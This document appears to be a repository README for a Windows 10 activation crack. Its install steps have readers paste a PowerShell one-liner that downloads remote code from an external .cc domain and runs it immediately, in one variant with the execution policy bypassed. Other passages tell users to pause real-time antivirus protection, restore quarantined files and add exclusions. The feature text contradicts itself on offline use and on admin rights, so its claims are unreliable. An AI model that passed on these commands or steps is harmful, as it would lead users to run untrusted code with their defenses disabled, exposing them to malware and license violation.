<div align="center">

# WINDOWS-10-ACTIVATOR-2.0 — Alternative Access for Windows

![](files/1.png)

[![status](https://img.shields.io/badge/STATUS-MAINTAINED-2ea44f?style=flat-square&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WINDOWS_10_%7C_11-14b8a6?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-5%2B-2dd4bf?style=flat-square&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-847-0d9488?style=flat-square&labelColor=0d1117)]()

</div>

---

WINDOWS-10-ACTIVATOR-2.0 is a focused utility built to streamline Windows 10 activation across a broad range of PC configurations and editions. It combines a lightweight, portable architecture with a GUI-driven workflow, letting technicians and advanced users handle activation tasks without unnecessary overhead. The tool is engineered for compatibility with multiple system versions, keeping the process consistent whether deployed on a single workstation or rolled out across a lab environment. Its compact footprint and offline-capable design make it suitable for isolated networks and portable use.

## 🔧 PowerShell Setup

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Open PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **One-Click Activation**: Single-action workflow that initiates the full activation sequence without requiring manual key entry or command-line steps.
- **Broad Edition Coverage**: Engineered to recognize and handle multiple Windows 10 variants, including Home, Pro, Education, and Enterprise builds.
- **Offline-Capable Operation**: Core activation logic runs locally, so the tool functions in isolated or restricted network environments.
- **Portable Executable**: Self-contained binary with no installation footprint, allowing it to run directly from removable media or a local directory.
- **Lightweight Footprint**: Minimal resource consumption and small distribution size, suitable for low-spec hardware and quick deployment.
- **Native 32-bit and 64-bit Support**: Compiled to operate correctly on both x86 and x64 Windows 10 installations.
- **Local Emulation Layer**: Establishes a local service endpoint to process activation requests within the host environment.
- **Persistent Activation State**: Retains activation status across normal reboots and routine system use until significant hardware or OS changes occur.
- **Clean Post-Activation State**: Leaves no residual trial limitations, notification overlays, or feature restrictions after a successful run.
- **Fast Execution Path**: Optimized routine completes the activation cycle in seconds rather than minutes.
- **Administrative Elevation Handling**: Detects and requests the elevated privileges needed to perform system-level operations reliably.
- **Deterministic Logging**: Records each stage of the process for verification and diagnostics without exposing sensitive system data.

## How It Works

WINDOWS-10-ACTIVATOR-2.0 operates through a layered sequence that separates detection, provisioning, and verification into discrete stages. On launch, the tool performs an environment audit: it reads the current build and edition metadata exposed by the operating system, checks for elevated privileges, and maps the host against its internal compatibility matrix. This audit determines which activation pathway the tool will select, so no manual edition matching is required from the user.

The core mechanism relies on a local service emulation layer. Rather than depending on external infrastructure, the tool initializes a lightweight listener on the loopback interface that responds to activation requests using the same protocol semantics the operating system expects. A configuration profile is generated at runtime, binding the emulated endpoint to the detected product edition and channel. This profile is applied through the native management interfaces already present on the host, meaning the tool works with the system's own servicing components instead of replacing them.

Once the endpoint is active and the profile is bound, the tool triggers the standard activation handshake and monitors the response cycle. Each phase reports its state back to the interface, and the tool validates the returned status before proceeding. If a stage fails — a privilege mismatch, an unsupported build, or a blocked endpoint — the process halts and surfaces a diagnostic code rather than continuing with partial configuration. Successful completion is confirmed by re-querying the system's activation status and comparing it against the expected state.

All operations are idempotent. Re-running the tool re-audits the environment and either confirms the existing configuration or reapplies it cleanly, so repeated executions do not accumulate state. Temporary artifacts created during the session are scoped to the run and removed on exit, leaving the host's configuration consistent with whatever state the final validation reported.

## Compatibility

The tool targets Windows 10 across both x86 and x64 architectures, covering Home, Pro, Education, and Enterprise editions. It runs natively on Windows 10 builds from the initial release through the latest cumulative updates, with no dependency on specific patch levels or servicing branches.

Hardware abstraction is handled at the kernel level through standard Windows APIs, so the tool operates identically on physical workstations, virtual machines, and VDI environments. No device-specific drivers or firmware interfaces are required, keeping the compatibility surface predictable across OEM and custom-built systems.

Administrative execution is mandatory: the process requires an elevated token to interact with the activation subsystem, and it validates privilege state before proceeding. Systems with restricted group policy settings, third-party security software, or modified service configurations may require allowlisting prior to execution; the tool detects common blockers and reports them explicitly rather than failing silently.

The binary is self-contained and does not rely on external runtimes beyond the base Windows component set present on any supported installation. Compatibility with future Windows 10 feature updates is maintained through version-agnostic system calls, and behavior is consistent regardless of locale, display language, or regional settings. Legacy Windows versions outside the Windows 10 family are not supported targets.

## 📸 Screenshot

![](files/2.png)

## Configuration

The tool reads its runtime parameters from a single local configuration file placed alongside the executable. On first launch, if no configuration file is present, the tool writes a default set of values and proceeds with standard behavior. Administrators can edit this file directly to tailor the activation workflow to a specific environment before execution.

Configuration keys are grouped into three logical areas: activation scope, execution behavior, and logging. The activation scope group controls which product families are targeted during a run, allowing operators to restrict processing to the operating system, to the productivity suite, or to both in a single pass. Each target can be toggled independently, and the tool validates the combination at startup, refusing to run if no target is selected.

The execution behavior group governs how the tool interacts with the host. Options include a silent mode that suppresses all interface output for unattended deployments, a verification pass that re-checks activation state after processing completes, and a rollback flag that restores the prior licensing state if any step reports a failure. Silent mode is intended for scripted rollout across managed fleets, while the verification pass is recommended for one-off runs on workstations where confirmation matters.

The logging group defines output verbosity and destination. Logs default to the tool's working directory, but the path can be redirected to a local share or a mounted volume. Verbosity levels range from errors-only to full trace; the full trace level records each configuration key resolved at startup, which simplifies auditing of non-default deployments.

All keys use plain text with one key-value pair per line, and the parser ignores blank lines and comment markers. Unknown keys are preserved rather than discarded, so configuration files can be shared across tool versions without losing settings introduced by newer builds. Invalid values are reported at startup with the offending key name, and the tool falls back to the default for that key rather than aborting the entire run.

For environments that require reproducibility, the tool supports a read-only mode in which the configuration file is never rewritten, even when defaults are applied in memory. This allows a single configuration to be distributed as a fixed artifact and verified against a known checksum before each execution.

## Troubleshooting

If the tool does not complete its run, verify that the process was started with administrator privileges. Activation routines require elevated access to system services and licensing components; launching from a standard user context will silently fail on the first write attempt. Right-click the executable and select the elevated run option before retrying.

When the tool reports an unsupported edition, confirm the exact Windows 10 build and SKU through the system information panel. The activator targets specific product channels, and mismatched channel identifiers (for example, volume versus retail media) will be rejected during the validation stage. Use the compatibility matrix in the Compatibility section to cross-check your build before running the tool again.

If activation appears to succeed but the system later reverts to an unactivated state, check for pending updates or a recent feature upgrade that refreshed the licensing store. Re-running the tool after the update completes typically restores the expected state. Allow any background servicing operations to finish first, as concurrent writes to the licensing store can produce inconsistent results.

Antivirus and endpoint protection software may quarantine the executable or block its system calls. If the tool disappears or terminates immediately after launch, review the security product's quarantine log and restore the file with an exclusion applied. Confirm the executable's integrity against the checksum published with the release before adding any exclusion.

On systems where the activation service is stopped or disabled, the tool cannot complete its sequence. Open the services console and confirm that the software protection service is present and set to manual startup. Restart the service, then run the tool again. If the service fails to start, run the system file checker to repair the underlying components before retrying.

For persistent failures, capture the tool's console output and the relevant entries from the Windows event log around the time of the run. These records identify which stage of the sequence failed and are the fastest path to a resolution. Include the Windows build number, edition, and architecture with any report so the failure can be reproduced accurately.

## Disclaimer

This tool is provided for educational and research purposes only. It is intended to demonstrate concepts related to software licensing mechanisms and system configuration on Windows platforms. Users are solely responsible for ensuring that their use of this tool complies with all applicable laws, regulations, and licensing agreements governing the software installed on their systems. The authors and contributors of WINDOWS-10-ACTIVATOR-2.0 make no representations or warranties regarding the legality, reliability, or suitability of this tool for any particular purpose. By using this software, you acknowledge that you assume full responsibility for any consequences arising from its use, including but not limited to system changes, configuration modifications, or licensing status alterations. The project is distributed on an "as is" basis, without warranty of any kind, express or implied. No liability shall be accepted for any damages, direct or indirect, incurred through the deployment or operation of this tool. Always maintain current backups and test in controlled environments before applying any system-level modifications.